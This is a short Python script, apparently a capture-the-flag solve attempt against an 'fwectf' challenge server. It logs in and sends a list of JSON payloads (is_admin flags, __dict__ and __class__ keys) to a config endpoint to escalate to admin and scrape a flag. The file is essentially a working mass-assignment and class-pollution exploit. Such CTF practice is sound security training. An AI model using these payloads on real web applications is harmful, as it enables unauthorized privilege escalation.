import requests
import re
from bs4 import BeautifulSoup

BASE = "http://db370dbcee6b4d7a8d0518ea5028f09b0.chal2.fwectf.com:8006"
USERNAME = "fuzzer123"
PASSWORD = "pw123"

s = requests.Session()

# Đăng ký (bỏ qua nếu user đã tồn tại)
s.post(f"{BASE}/register", data={"username": USERNAME, "password": PASSWORD})

# Đăng nhập
s.post(f"{BASE}/login", data={"username": USERNAME, "password": PASSWORD})

# Payloads để thử
payloads = [
    {"username": "admin", "is_admin": True, "config": {"mode": "admin"}},
    {"config": {"flag": "test"}},
    {"config": {"__dict__": {}}},
    {"__dict__": {"username": "admin", "is_admin": True}},
    {"config": {"mode": "admin", "__class__": {}}},
]

for idx, p in enumerate(payloads, 1):
    print(f"\n=== Payload {idx} ===")
    try:
        r = s.post(f"{BASE}/api/config", json=p)
        print("[*] POST /api/config ->", r.text)

        r = s.get(f"{BASE}/")
        soup = BeautifulSoup(r.text, "html.parser")
        pre = soup.find("pre")
        if pre:
            print("[*] <pre> content:\n", pre.text)
            flags = re.findall(r"fwectf\{.*?\}", pre.text)
            if flags:
                print("[+] FLAG FOUND:", flags[0])
                break
        else:
            print("[!] Không thấy thẻ <pre> trong /")
    except Exception as e:
        print("Error:", e)
